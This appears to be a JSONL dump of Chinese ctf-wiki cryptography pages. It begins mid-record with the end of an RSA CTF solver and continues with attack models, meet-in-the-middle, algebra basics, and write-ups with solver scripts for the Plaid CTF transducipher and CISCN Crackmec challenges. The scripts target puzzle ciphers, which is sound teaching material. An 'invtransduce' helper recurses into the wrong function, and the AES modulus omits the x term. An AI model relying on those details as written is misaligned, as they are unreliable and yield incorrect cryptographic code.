phi)\nenc = pow(bytes_to_long(flag), 0x10001, n)\nprint 'n =', n\nprint 'enc =', enc\n```\n\n$p$ 和 $q$ 自然为\n\n$p=next\\_prime(9y^3)$\n\n$q=next\\_prime(6y^3)$\n\n根据素数的间隔，可以知道 $p$ 和 $q$ 最多比括号里的数字大一点，这里一般不会超过 $1000$。\n\n那么\n\n$n \\geq 54y^6$\n\n所以我们知道了 $y$ 的上界，而对于 $y$ 的下界其实也不会离上界太远，我们大概减个几十万。进而，我们利用二分查找的方式来寻找 $p$ 和 $q$，如下\n\n```python\nimport gmpy2\ntmp = 30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146\n\nprint gmpy2.iroot(tmp, 2018)\nprint gmpy2.iroot(tmp - 1, 2018)\n\nprint gmpy2.iroot(tmp - 2, 2018)\n\nn = 260272753019642842691231717156206014402348296256668058656902033827190888150939144319270903947159599144884859205368557385941127216969379550487700198771513118894125094678559478972591331182960004648132846372455712958337042783083099376871113795475285658106058675217077803768944674144803250791799957440111855021945690877200606577646234107957498370758707097662736662439460472126493593605957225541979181422479704018055731221681621886820626215670393536343427267329350730257979042198593215747542270975288047196483958369426727778580292311145109908665004662296440533724591193527886702374790526322791818523938910660223971454070731594803459613066617828657725704376475527288174777197739360634209448477565044519733575375490101670974499385760735451471034271880800081246883157088501597655371430353965493264345172541221268942926210055390568364981514774743693528424196241142665685211916330254113610598390909248626686397970038848966187547231199741\n\ny = 191904757378974300059526915134037747982760255307942501070454569331878491189601823952845623286161325306079772871025816081849039036850918375408172174102720702781463514549851887084613000000L\ny = gmpy2.next_prime(y)\n\nenc = 73933313646416156737449236838459526871566017180178176765840447023088664788672323530940171469589918772272559607026808711216932468486201094786991159096267208480969757088208089800600731106685561375522764783335332964711981392251568543122418192877756299395774738176188452197889668610818741062203831272066261677731889616150485770623945568369493256759711422067551058418926344060504112146971937651406886327429318390247733970549845424064244469193626197360072341969574784310397213033860597822010667926563087858301337091484951760613299203587677078666096526093414014637559237148644939541419075479462431789925219269815364529507771308181435591670281081465439913711912925412078002618729159141400730636976744132429329651487292506365655834202469178066850282850374067239317928012461993443785247524500680257923687511378073703423047348824611101206633407452837948194591695712958510124436821151767823443033286425729473563002691262316964646014201612\n\nend = gmpy2.iroot(n / 54, 6)[0]\nbeg = end - 2000000\n\nmid = 1\nwhile beg < end:\n    mid = (beg + end) / 2\n    if gmpy2.is_prime(mid) != 1:\n        mid = gmpy2.next_prime(mid)\n    p = gmpy2.next_prime(9 * mid**3)\n    q = gmpy2.next_prime(6 * mid**3)\n    n1 = p * q\n    if n1 == n:\n        print p, q\n        phin = (p - 1) * (q - 1)\n        d = gmpy2.invert(0x10001, phin)\n        m = gmpy2.powmod(enc, d, n)\n        print hex(m)[2:].strip('L').decode('hex')\n        print 'ok'\n        exit(0)\n    elif n1 < n:\n        beg = mid\n    else:\n        end = mid\n    print beg, end\n```\n\n\n\n\n\n", "timestamp": "2025-10-21T22:02:49.232840"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/attack-summary/attack-mode.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/attack-summary/attack-mode.md", "content": "# 简介\n\n## 攻击模式\n\n在我们攻击一个密码学系统时，我们或多或少会得到关于这个系统的一些信息。根据得到信息量的不同，我们可以采用的方法就可能不同。在当今的密码学分析时，一般我们都会假设攻击者知道密码学算法，这个假设是合理的，因为历史上有很多保密的算法最后都被人所知，比如 RC4。被知道的方式多重多样，比如间谍，逆向工程等。\n\n这里我们根据攻击者获取密码学系统的信息的多少将攻击模式分为以下几类\n\n- **唯密文攻击**：攻击者仅能获得一些加密过的密文。\n- **已知明文攻击**：攻击者有一些密文对应的明文。\n- **选择明文攻击**：攻击者在开始攻击时可以选择一些明文，并获取加密后的密文。如果攻击者在攻击中途可以根据已经获取的信息选择新的明文并获取对应的密文，则称为适应性选择明文攻击。\n- **选择密文攻击**：攻击者在开始攻击之前可以选择一些密文，并获取解密后的明文。如果攻击者在攻击图中可以根据已经获取的信息选择一些新的密文并获取对应的明文，则称为适应性选择密文攻击。\n- **相关密钥攻击**：攻击者可以获得两个或多个相关密钥的加密或解密后的密文或明文。但是攻击者不知道这些密钥。\n\n## 常见攻击方法\n\n根据不同的攻击模式，可能会有不同的攻击方法，目前常见的攻击方法主要有\n\n- 暴力攻击\n- 中间相遇攻击\n- 线性分析\n- 差分分析\n- 不可能差分分析\n- 积分分析\n- 代数分析\n- 相关密钥攻击\n- 侧信道攻击\n\n## 参考文献\n\n- https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90\n", "timestamp": "2025-10-21T22:02:49.508262"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/attack-summary/bit-attack.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/attack-summary/bit-attack.md", "content": "# 比特攻击\n\n## 概述\n\n简单地说，就是利用比特位之间的关系进行攻击。\n\n## 2018 Plaid CTF transducipher\n\n题目如下\n\n```python\n#!/usr/bin/env python3.6\nimport os\n\nBLOCK_SIZE = 64\n\nT = [\n    ((2, 1), 1),\n    ((5, 0), 0),\n    ((3, 4), 0),\n    ((1, 5), 1),\n    ((0, 3), 1),\n    ((4, 2), 0),\n]\n\n\ndef block2bin(b, length=BLOCK_SIZE):\n    return list(map(int, bin(b)[2:].rjust(length, '0')))\n\n\ndef bin2block(b):\n    return int(\"\".join(map(str, b)), 2)\n\n\ndef transduce(b, s=0):\n    if len(b) == 0:\n        return b\n    d, t = T[s]\n    b0, bp = b[0], b[1:]\n    return [b0 ^ t] + transduce(bp, s=d[b0])\n\n\ndef transduceblock(b):\n    return bin2block(transduce(block2bin(b)))\n\n\ndef swap(b):\n    l = BLOCK_SIZE // 2\n    m = (1 << l) - 1\n    return (b >> l) | ((b & m) << l)\n\n\nclass Transducipher:\n\n    def __init__(self, k):\n        self.k = [k]\n        for i in range(1, len(T)):\n            k = swap(transduceblock(k))\n            self.k.append(k)\n\n    def encrypt(self, b):\n        for i in range(len(T)):\n            b ^= self.k[i]\n            b = transduceblock(b)\n            b = swap(b)\n        return b\n\n\nif __name__ == \"__main__\":\n    flag = bytes.hex(os.urandom(BLOCK_SIZE // 8))\n    k = int(flag, 16)\n    C = Transducipher(k)\n    print(\"Your flag is PCTF{%s}\" % flag)\n    with open(\"data1.txt\", \"w\") as f:\n        for i in range(16):\n            pt = int(bytes.hex(os.urandom(BLOCK_SIZE // 8)), 16)\n            ct = C.encrypt(pt)\n            f.write(str((pt, ct)) + \"\\n\")\n\n```\n\n题目给了 16 组明密文对\n\n- 明文大小 8 个字节\n- 密文大小 8 个字节\n- 密钥大小也是 8 个字节\n\n我们所需要求解的就是密钥。\n\n可以看到这里主要有两种基本操作\n\n- swap\n\n```python\ndef swap(b):\n    l = BLOCK_SIZE // 2\n    m = (1 << l) - 1\n    return (b >> l) | ((b & m) << l)\n```\n\n将给定的数据的高 32 位与低 32 位交换。\n\n- transduce\n\n```python\nT = [\n    ((2, 1), 1),\n    ((5, 0), 0),\n    ((3, 4), 0),\n    ((1, 5), 1),\n    ((0, 3), 1),\n    ((4, 2), 0),\n]\ndef transduce(b, s=0):\n    if len(b) == 0:\n        return b\n    d, t = T[s]\n    b0, bp = b[0], b[1:]\n    return [b0 ^ t] + transduce(bp, s=d[b0])\n```\n\n其中，\n\n- b 是一个 01 数组，初始时刻大小为 64。\n- s 是一个下标。\n\n基本流程如下\n\n1. 根据 s 选择使用 T 的哪个元素，进而将其分为 d 和 t。\n2. 将 b 分为两部分，一部分只包含头元素，另一部分包含其它的元素。\n3. 将头元素与 t 异或作为当前的头元素，然后继续转换剩下的部分。\n\n其实我们可以将该函数转换为迭代函数\n\n```python\ndef transduce_iter(b, s=0):\n    ans = []\n    for c in b:\n        d, t = T[s]\n        ans += [c ^ t]\n        s = d[c]\n    return ans\n```\n\n进而由于每次处理的是列表的第一个元素，其实该函数是可逆的，如下\n\n```python\ndef invtransduce(b, s=0):\n    if len(b) == 0:\n        return b\n    d, t = T[s]\n    b0, bp = b[0], b[1:]\n    return [b0 ^ t] + transduce(bp, s=d[b0 ^ t])\n```\n\n下面分析程序的核心流程，首先是生成密钥部分，该加密算法生成了 6 个密钥，每次生成的方法\n\n1. transduce 先前的密钥得到中间值 t\n2. 对 t 进行 swap\n3. 连续迭代 5 次\n\n```python\n    def __init__(self, k):\n        self.k = [k]\n        for i in range(1, len(T)):\n            k = swap(transduceblock(k))\n            self.k.append(k)\n```\n\n加密算法如下，一共迭代 6 轮，基本流程\n\n1. 异或密钥 transduce\n2. 交换\n\n```python\n    def encrypt(self, b):\n        for i in range(len(T)):\n            b ^= self.k[i]\n            b = transduceblock(b)\n            b = swap(b)\n        return b\n```\n\n通过分析程序，可知该加密算法是一个块加密，基本信息如下\n\n- 块大小为 8 个字节\n- 轮数为 6 轮\n- 加密算法的每轮的基本操作为 transduce 和 swap。\n- 密钥的扩展也是与 transduce 和 swap 相关。\n\n更具体的\n\n1. swap 是将 8 字节的高 32 位与低 32 位进行调换。\n2. transduce 是对于 8 字节的每个比特，逐比特与某个值进行异或。这个值与 T 有关。\n\n通过进一步地分析，我们可以发现这两个函数都是可逆的。也就是说，如果我们知道了最后的密文，那么我们其实可以将原来的轮数缩短为差不多 5 轮，因为最后一轮的 `transduce` 和`swap` 没有作用了。\n\n我们可以定义如下变量\n\n| 名字      | 含义                        |\n| --------- | --------------------------- |\n| $k_{i,0}$ | 第 i 轮使用的密钥的高 32 位 |\n| $k_{i,1}$ | 第 i 轮使用的密钥的低 32 位 |\n| $d_{i,0}$ | 第 i 轮使用的输入的高 32 位 |\n| $d_{i,1}$ | 第 i 轮使用的输入的低 32 位 |\n\n由于其中有一个核心操作是 swap，只会操纵高或低 32 位，所以我们可以分为两部分考虑。简化定义如下\n\n- Transduce 简化为 T，这里虽然与源代码里冲突，不过我们可以暂时理解一下。\n- Swap 简化为 S。\n\n则每一轮的明密文，密钥如下\n\n| 轮数 | 左侧密钥               | 左侧密文                               | 右侧密钥             | 右侧密文                            |\n| ---- | ---------------------- | -------------------------------------- | -------------------- | ----------------------------------- |\n| 0    | $k_{0,0}$              | $d_{1,0}=T(k_{0,1} \\oplus d_{0,1} ,s)$ | $k_{0,1}$            | $d_{1,1}=T(k_{0,0} \\oplus d_{0,0})$ |\n| 1    | $k_{1,0}=T(k_{0,1},s)$ | $d_{2,0}=T(k_{1,1} \\oplus d_{1,1} ,s)$ | $k_{1,1}=T(k_{0,0})$ | $d_{2,1}=T(k_{1,0} \\oplus d_{1,0})$ |\n| 2    | $k_{2,0}=T(k_{1,1},s)$ | $d_{3,0}=T(k_{2,1} \\oplus d_{2,1} ,s)$ | $k_{2,1}=T(k_{1,0})$ | $d_{3,1}=T(k_{2,0} \\oplus d_{2,0})$ |\n| 3    | $k_{3,0}=T(k_{2,1},s)$ | $d_{4,0}=T(k_{3,1} \\oplus d_{3,1} ,s)$ | $k_{3,1}=T(k_{2,0})$ | $d_{4,1}=T(k_{3,0} \\oplus d_{3,0})$ |\n| 4    | $k_{4,0}=T(k_{3,1},s)$ | $d_{5,0}=T(k_{4,1} \\oplus d_{4,1} ,s)$ | $k_{4,1}=T(k_{3,0})$ | $d_{5,1}=T(k_{4,0} \\oplus d_{4,0})$ |\n| 5    | $k_{5,0}=T(k_{4,1},s)$ | $d_{6,0}=T(k_{5,1} \\oplus d_{5,1} ,s)$ | $k_{5,1}=T(k_{4,0})$ | $d_{6,1}=T(k_{5,0} \\oplus d_{5,0})$ |\n\n那么，我们可以逐比特位枚举 k 的高 32 位，同时枚举在进行 T 操作时的可能的 s 状态位，这样就可以获取高 32 位密钥。在进行逐位爆破之后，我们可以从获取两个可能结果\n\n```\n[2659900894, 2659900895]\n```\n\n再根据左边的结果，可以去获取右边可能的结果，利用 2659900894 获取的可能的结果如下\n\n```\n# 第一组明密文对对应的密钥可能太多。\n# 第二组一共 6 个。\n[2764038144, 2764038145, 2764038152, 2764038153, 2764038154, 2764038155]\n# 第三组\n[2764038144, 2764038145]\n```\n\n然后其实我们就可以手工试一下加密所有的明密文，如果不对，就直接判断错误即可了。这样其实可以很快可以过滤。最后可以发现密钥是\n\n```\n2659900894|2764038145\n```\n\n也就是11424187353095200769。也就拿到了 flag。\n\n当然，本题目也可以使用中间相遇的攻击方法，也就是说分别枚举第 0 轮使用的密钥和最后一轮使用的密钥使其在第三轮相遇产生碰撞。\n\n## 参考\n\n- http://blog.rb-tree.xyz/2018/05/07/plaidctf-2018-transducipher/\n", "timestamp": "2025-10-21T22:02:49.661927"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/attack-summary/meet-in-the-middle.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/attack-summary/meet-in-the-middle.md", "content": "# 中间相遇攻击 - MITM\n\n## 概述\n\n中间相遇攻击是一种以空间换取时间的一种攻击方法，1977年由 Diffie 与 Hellman 提出。从个人角度看，者更多地指一种思想，不仅仅适用于密码学攻击，也适用于其他方面，可以降低算法的复杂度。\n\n基本原理如下\n\n假设 E 和 D 分别是加密函数和解密函数，k1 和 k2 分别是两次加密使用的密钥，则我们有\n\n$C=E_{k_2}(E_{k_1}(P))$\n\n$P=D_{k_1}(D_{k_2}(C))$\n\n则我们可以推出\n\n$E_{k_1}(P)=D_{k_2}(C)$\n\n那么，当用户知道一对明文和密文时\n\n1. 攻击者可以枚举所有的 k1，将 P 所有加密后的结果存储起来，并按照密文的大小进行排序。\n2. 攻击者进一步枚举所有的k2，将密文 C 进行解密得到 C1，在第一步加密后的结果中搜索 C1，如果搜索到，则我们在一定程度上可以认为我们找到了正确的 k1 和  k2。\n3. 如果觉得第二步中得到的结果不保险，则我们还可以再找一些明密文对进行验证。\n\n假设 k1 和 k2 的密钥长度都为 n，则原先我们暴力枚举需要 $O(n^2)$，现在我们只需要 $O(n log_2n)$。\n\n这与 2DES 的中间相遇攻击类似。\n\n## 题目\n\n- 2018 国赛 Crackmec，参见 Wiki AES 部分\n- 2018 Plaid CTF Transducipher，参见比特攻击部分的原理。\n- 2018 国赛 Crackme java，参见 Wiki 整数域上的离散对数部分\n- 2018 WCTF RSA，参见 wiki RSA Complex 部分\n\n## 参考文献\n\n- https://zh.wikipedia.org/wiki/%E4%B8%AD%E9%80%94%E7%9B%B8%E9%81%87%E6%94%BB%E6%93%8A\n\n", "timestamp": "2025-10-21T22:02:49.769922"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/basic/introduction.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/basic/introduction.md", "content": "# 基础数学知识\n<!-- https://ctf-wiki.org/crypto/basic/introduction/ -->\n本部分会介绍“基础数学知识”，这里加了引号，所以并不见得真的很基础。。\n\n## 代数系统和近世代数\n\n在一个集合中，如若有一种或多种**代数运算**（Algebraic Operation），我们往往会笼统地称它为**代数系统**（Algebraic System），也称**代数结构**（Algebraic Structure）。\n\n作为一个不断进步完善的数学分支，代数学的研究范围也逐渐扩大，其关注的集合亦从古典的整数、有理数、实数与复数等常见数集，扩展到矢量、矩阵、线性算子等对象，并着眼于定义在它们之上的代数运算。这类课题共同组成了如今的**近世代数**（Modern Algebra）学科，或言**抽象代数**（Abstract Algebra）。\n\n上文提到的代数运算，是定义在集合中的元素之间的法则，亦与集合是否能**作成**代数系统有着密切关联，它们扩展自常见的加减乘除这样的运算。经过定义合适的代数运算，集合可以作成群、环、域、格等代数系统，这也是笔者行将介绍的。\n\n## 群\n\n给定一个集合 $G\\neq\\varnothing$ 以及其上的二元代数运算「 $\\circ$ 」，如若它们满足如下性质：\n\n1. 封闭性（Closure）： $\\forall v, u \\in G, \\quad v \\circ u \\in G;$\n2. 结合律（Associativity）： $\\forall v, u, w \\in G, \\quad (v \\circ u) \\circ w = v \\circ (u \\circ w);$\n3. 单位元（Identity）： $\\exists e \\in G, \\forall v \\in G, \\quad e \\circ v = v;$\n4. 逆元（Inverse，亦称反元）： $\\forall v \\in G, \\exists v^{-1} \\in G, \\quad v^{-1} \\circ v = e;$\n\n则称集合 $G$ 对该代数运算作成一个**群**（Group），记作 $(G,\\circ)$.\n\n一个很常见的例子便是所谓的整数加法群 $(\\mathbb{Z},+)$，不难验证其不仅对加法封闭，满足结合律，且存在整数 $0$ 作为单位元，并对于每个整数 $m$ 皆有其相反数 $-m$ 作为其逆元。类似地，可以验证正有理数集 $(\\mathbb{Q}_+,\\times)$ 对乘法亦作成群（单位元为 $1$ ，对于每个元素 $a$ 其逆元为 $\\frac{1}a$）；实数域 $\\mathbb{R}$ 上的全体 $m$ 阶可逆矩阵对于矩阵乘法作成群（单位元为 $m$ 阶单位矩阵 $E_m$，对于每个元素 $A$ 其逆元为它的逆矩阵 $A^{-1}$），这在近世代数中被称为 $m$ 阶一般线性群 $GL_m(\\mathbb{R})$.\n\n此外笔者举出一个更简单的例子，即是定义在集合 $\\{-1,1\\}$ 上的乘法群 $(\\{-1,1\\},\\times)$，这亦不难验证其作成一个群。\n\n在近世代数中，研究群的分支被称为**群论**（Group Theory）。\n\n### 半群和幺半群\n\n在近世代数中，有些代数系统具有环的部分性质，虽不在我们的主要讨论范围内，但它们也具有广泛的应用场景与不可忽视的研究价值：\n\n对于其上二元代数运算封闭的非空集合，\n\n* 如若仅满足结合律，那么可以称该集合对该代数运算作成**半群**（Semigroup）；\n* 如若集合对于代数运算除封闭外，满足结合律，且具有单位元，则可以称其对该运算作成**幺半群**（Monoid）。\n\n由此，我们可以认为：\n\n* 幺半群是含有单位元的半群；\n* 群是每个元素皆有逆元的幺半群。\n\n举例来说，正整数对于整数加法作成半群，而非负整数对于整数加法作成幺半群，由于零可以视为整数加法的单位元。\n\n### 交换群\n\n给定一个群 $(G,\\circ)$，如若其满足交换律（Commutativity）i.e. $\\forall v, u \\in G,$ $ v \\circ u = u \\circ v, $ 则称这个群是一个**交换群**或 Abel（阿贝尔）群（Abelian Group）。\n\n易见，上文提到的举例中，整数加法群 $(\\mathbb{Z},+)$ 是交换群，但 $m$ 阶一般线性群 $GL_m(\\mathbb{R})$ 不是交换群。\n\n### 环和域\n\n给定一个集合 $R\\neq\\varnothing$ 以及其上的两个二元代数运算「 $+$ 」和「 $\\circ$ 」，如若它们满足如下性质：\n\n1. $(R,+)$ 作成交换群；\n2. $R$ 对运算「 $\\circ$ 」满足结合律： $\\forall v, u, w \\in R,$ 皆有 $(v \\circ w) \\circ u = v \\circ (w \\circ u);$\n3. 分配律（Distributivity）： $\\forall v, u, w \\in R,$ 皆有 $w \\circ (v + u) = w \\circ v + w \\circ u$ 与 $(v + u) \\circ w = v \\circ w + u \\circ w$ 成立；\n\n则称集合 $R$ 对此二代数运算作成一个**环**（Ring），记作 $(R,+,\\circ)$，并常分别称运算「$+$」和「$\\circ$」为加法和乘法。\n\n* 如若环 $R$ 上的乘法存在单位元 i.e. $\\exists e \\in G, \\forall v \\in G,$ 皆有 $e \\circ v = v,$ 则称环 $R$ 为**幺环**（Ring with identity）；\n* 如若环 $R$ 上的乘法满足交换律，则称其为**交换环**（Commutative Ring）；\n* 如若环 $R$ 中对除加法单位元外任意元素 $a \\neq 0$ 皆存在乘法逆元 $a^{-1}$，则称 $R$ 为**除环**（Division Ring）；\n* 如若环 $R$ 既是交换环又是除环，那么环 $R$ 是一个**域**（Field）。\n\n> 在部分书籍中，默认环含有乘法单位元，并称不含有乘法单位元的环为**伪环**（Pseudo Ring）。\n\n在近世代数中，研究环和域的分支被分别称为**环论**（Ring Theory）和**域论**（Field Theory）。\n\n> 在部分繁体中文语境下，域和域论常被称为**体**和**体论**（繁体中文分别写作「體」和「體論」）。\n\n### 阶\n\n指数：仿照数的指数，我们定义群中元素的指数，对于 $v \\in G, m$ 为正整数，\n\n* $v^0 = e;$\n* $v^m = v \\circ v \\circ \\cdots \\circ v,$ 其中共有 $m$ 个 $v$ 参与代数运算；\n* $v^{-m} = \\left(v^{-1}\\right)^m;$\n\n元素的阶：对于任意给定的元素 $v \\in G,$ 如若正整数 $m$ 满足 $v^m = e,$ 则称元素 $v$ 的阶数为 $m$. 如若这样的正整数不存在，则称该元素的阶为无限。\n\n举例而言，在群 $\\left(\\{1,-1,+\\mathrm{j},-\\mathrm{j}\\},\\times\\right)$ 中，各元素的阶如下：\n\n| 元素 | 阶 |\n|:-:|:-:|\n| 1 | 1 |\n| -1 | 2 |\n| $+\\mathrm{j}$ | 4 |\n| $-\\mathrm{j}$ | 4 |\n\n### 同态\n\n代数系统间的**同态**（Homomorphism）指在不同代数系统间能够保持代数运算的映射。\n\n具体来讲，对于群 $(G,\\circ)$ 和 $(H,\\ast)$ 而言，如若一个映射 $\\psi: G \\to H$ 满足 $\\forall v, u \\in G,$\n\n$$ \\psi(v \\circ u) = \\psi(v) \\ast \\psi(u), $$\n\n那么映射 $\\psi$ 便可以称为从 $G$ 到 $H$ 的一个**群同态**。\n\n## References\n\n* 杨子胥，《近世代数》（第四版），高等教育出版社\n* [群论简介 - OI-Wiki](https://oi-wiki.org/math/group-theory/)\n", "timestamp": "2025-10-21T22:02:50.200669"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/blockcipher/aes.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/aes.md", "content": "# AES\n\n## 基本介绍\n\nAdvanced Encryption Standard（AES），高级加密标准，是典型的块加密，被设计来取代 DES，由 Joan Daemen 和 Vincent Rijmen 所设计。其基本信息如下\n\n- 输入：128 比特。\n- 输出：128 比特。\n- SPN 网络结构。\n\n其迭代轮数与密钥长度有关系，如下\n\n| 密钥长度（比特） | 迭代轮数 |\n| :--------------: | :------: |\n|       128        |    10    |\n|       192        |    12    |\n|       256        |    14    |\n\n## 基本流程\n\n### 基本概念\n\n在 AES 加解密过程中，每一块都是 128 比特，所以我们这里明确一些基本概念。\n\n![](./figure/aes_data_unit.png)\n\n在 AES 中，块与 State 之间的转换过程如下\n\n![](./figure/aes_block2state.png)\n\n所以，可以看出，每一个 block 中的字节是按照列排列进入到状态数组的。\n\n而对于明文来说，一般我们会选择使用其十六进制进行编码。\n\n![](./figure/aes_plain2state.png)\n\n\n\n### 加解密过程\n\n这里给个看雪上比较好的 [图例](http://bbs.pediy.com/thread-90722.htm) ，以便于介绍基本的流程，每一轮主要包括\n\n- 轮密钥加，AddRoundKey\n- 字节替换，SubBytes\n- 行移位，ShiftRows\n- 列混淆，MixColumns\n\n![](./figure/aes_details.jpg)\n\n上面的列混淆的矩阵乘法等号左边的列向量应该在右边。\n\n这里再给一张其加解密的全图，其解密算法的正确性很显然。\n\n![](./figure/aes_enc_dec.png)\n\n我们这里重点关注一下以下。\n\n#### 字节替换\n\n在字节替换的背后，其实是有对应的数学规则来定义对应的替换表的，如下\n\n![](./figure/aes_subbytes.png)\n\n这里的运算均定义在 $GF(2^8)$ 内。\n\n#### 列混淆\n\n这里的运算也是定义在 $GF(2^8)$ 上，使用的模多项式为 $x^8+x^4+x^3+1$。\n\n#### 密钥扩展\n\n![](./figure/aes_key_expansion.png)\n\n## 等价解密算法\n\n简单分析一下，我们可以发现\n\n- 交换逆向行移位和逆向字节代替并不影响结果。\n- 交换轮密钥加和逆向列混淆并不影响结果，关键在于\n  - 首先可以把异或看成域上的多项式加法\n  - 然后多项式中乘法对加法具有分配率。\n\n## 攻击方法\n\n- 积分攻击\n\n## 2018 国赛 Crackmec\n\n通过简单分析这个算法，我们可以发现这个算法是一个简化版的 AES，其基本操作为\n\n- 9 轮迭代\n    - 行移位\n    - 变种字节替换\n\n如下\n\n```c\n  memcpy(cipher, plain, 0x10uLL);\n  for ( i = 0LL; i <= 8; ++i )\n  {\n    shift_row(cipher);\n    for ( j = 0LL; j <= 3; ++j )\n      *(_DWORD *)&cipher[4 * j] =\n        box[((4 * j + 3 + 16 * i) << 8) + (unsigned __int8)cipher[4 * j + 3]] ^\n        box[((4 * j + 2 + 16 * i) << 8) + (unsigned __int8)cipher[4 * j + 2]] ^\n        box[((4 * j + 1 + 16 * i) << 8) + (unsigned __int8)cipher[4 * j + 1]] ^\n        box[((4 * j + 16 * i) << 8) + (unsigned __int8)cipher[4 * j]];\n  }\n  result = shift_row(cipher);\n  for ( k = 0LL; k <= 0xF; ++k )\n  {\n    result = subbytes[256 * k + (unsigned __int8)cipher[k]];\n    cipher[k] = result;\n  }\n  return result;\n```\n\n根据程序流程，我们已知程序加密的结果，而 subbytes 和 shift_row 又是可逆的，所以我们可以获取最后一轮加密后的结果。此时，我们还知道 box 对应的常数，我们只是不知道上一轮中 `cipher[4*j]` 对应的值，一共 32 位，如果我们直接爆破的话，显然不可取，因为每一轮都需要这么爆破，时间不可接受。那么有没有其它办法呢？其实有的，我们可以考虑中间相遇攻击，即首先枚举所有的 `cipher[4*j]` 与`cipher[4*j+1]` 的字节组合，一共256\\*256 种。在枚举剩下两个字节时，我们可以先计算出其与密文的异或值，然后去之前的组合中找，如果找到的话，我们就认为是正确的。这样复杂度瞬间降到 $O(2^{16})$。\n\n代码如下\n\n```python\nencflag = [\n    0x16, 0xEA, 0xCA, 0xCC, 0xDA, 0xC8, 0xDE, 0x1B, 0x16, 0x03, 0xF8, 0x84,\n    0x69, 0x23, 0xB2, 0x25\n]\nsubbytebox = eval(open('./subbytes').read())\nbox = eval(open('./box').read())\nprint subbytebox[-1], box[-1]\n\n\ndef inv_shift_row(now):\n    tmp = now[13]\n    now[13] = now[9]\n    now[9] = now[5]\n    now[5] = now[1]\n    now[1] = tmp\n\n    tmp = now[10]\n    now[10] = now[2]\n    now[2] = tmp\n    tmp = now[14]\n    now[14] = now[6]\n    now[6] = tmp\n\n    tmp = now[15]\n    now[15] = now[3]\n    now[3] = now[7]\n    now[7] = now[11]\n    now[11] = tmp\n\n    return now\n\n\ndef byte2num(a):\n    num = 0\n    for i in range(3, -1, -1):\n        num = num * 256\n        num += a[i]\n    return num\n\n\ndef getbytes(i, j, target):\n    \"\"\"\n    box[((4 * j + 3 + 16 * i) << 8) + a2[4 * j + 3]]\n    box[((4 * j + 2 + 16 * i) << 8 )+ a2[4 * j + 2]]\n    box[((4 * j + 1 + 16 * i) << 8) + a2[4 * j + 1]]\n    box[((4 * j + 16 * i) << 8) + a2[4 * j]];\n    \"\"\"\n    box01 = dict()\n    for c0 in range(256):\n        for c1 in range(256):\n            num0 = ((4 * j + 16 * i) << 8) + c0\n            num1 = ((4 * j + 1 + 16 * i) << 8) + c1\n            num = box[num0] ^ box[num1]\n            box01[num] = (c0, c1)\n    for c2 in range(256):\n        for c3 in range(256):\n            num2 = ((4 * j + 2 + 16 * i) << 8) + c2\n            num3 = ((4 * j + 3 + 16 * i) << 8) + c3\n            num = box[num2] ^ box[num3]\n            calc = num ^ target\n            if calc in box01:\n                c0, c1 = box01[calc]\n                return c0, c1, c2, c3\n    print 'not found'\n    print i, j, target, calc\n    exit(0)\n\n\ndef solve():\n    a2 = [0] * 16\n    \"\"\"\n      for ( k = 0LL; k <= 0xF; ++k )\n      {\n        result = subbytesbox[256 * k + a2[k]];\n        a2[k] = result;\n      }\n    \"\"\"\n    for i in range(15, -1, -1):\n        tag = 0\n        for j in range(256):\n            if subbytebox[256 * i + j] == encflag[i]:\n                # j = a2[k]\n                tag += 1\n                a2[i] = j\n                if tag == 2:\n                    print 'two number', i\n                    exit(0)\n    \"\"\"\n      result = shift_row(a2);\n    \"\"\"\n    a2 = inv_shift_row(a2)\n    \"\"\"\n      for ( i = 0LL; i <= 8; ++i )\n      {\n        shift_row(a2);\n        for ( j = 0LL; j <= 3; ++j )\n          *(_DWORD *)&a2[4 * j] = box[((4 * j + 3 + 16 * i) << 8) + a2[4 * j + 3]] ^ box[((4 * j + 2 + 16 * i) << 8)\n                                                                                       + a2[4 * j + 2]] ^ box[((4 * j + 1 + 16 * i) << 8) + a2[4 * j + 1]] ^ box[((4 * j + 16 * i) << 8) + a2[4 * j]];\n      }\n    \"\"\"\n    for i in range(8, -1, -1):\n        tmp = [0] * 16\n        print 'round ', i\n        for j in range(0, 4):\n            num = byte2num(a2[4 * j:4 * j + 4])\n            #print num, a2[4 * j:4 * j + 4]\n            tmp[4 * j\n               ], tmp[4 * j + 1], tmp[4 * j + 2], tmp[4 * j + 3] = getbytes(\n                   i, j, num\n               )\n        a2 = inv_shift_row(tmp)\n    print a2\n    print ''.join(chr(c) for c in a2)\n\n\nif __name__ == \"__main__\":\n    solve()\n```\n\n运行结果\n\n```shell\n➜  cracemec git:(master) ✗ python exp.py\n211 3549048324\nround  8\nround  7\nround  6\nround  5\nround  4\nround  3\nround  2\nround  1\nround  0\n[67, 73, 83, 67, 78, 98, 35, 97, 100, 102, 115, 64, 70, 122, 57, 51]\nCISCNb#adfs@Fz93\n```\n\n## 题目\n\n- 2018 强网杯 决赛 revolver\n\n## 参考文献\n\n- https://zh.wikipedia.org/wiki/%E9%AB%98%E7%BA%A7%E5%8A%A0%E5%AF%86%E6%A0%87%E5%87%86\n- Cryptography and Network Security， Advanced Encryption Standard  ppt\n", "timestamp": "2025-10-21T22:02:50.474867"}
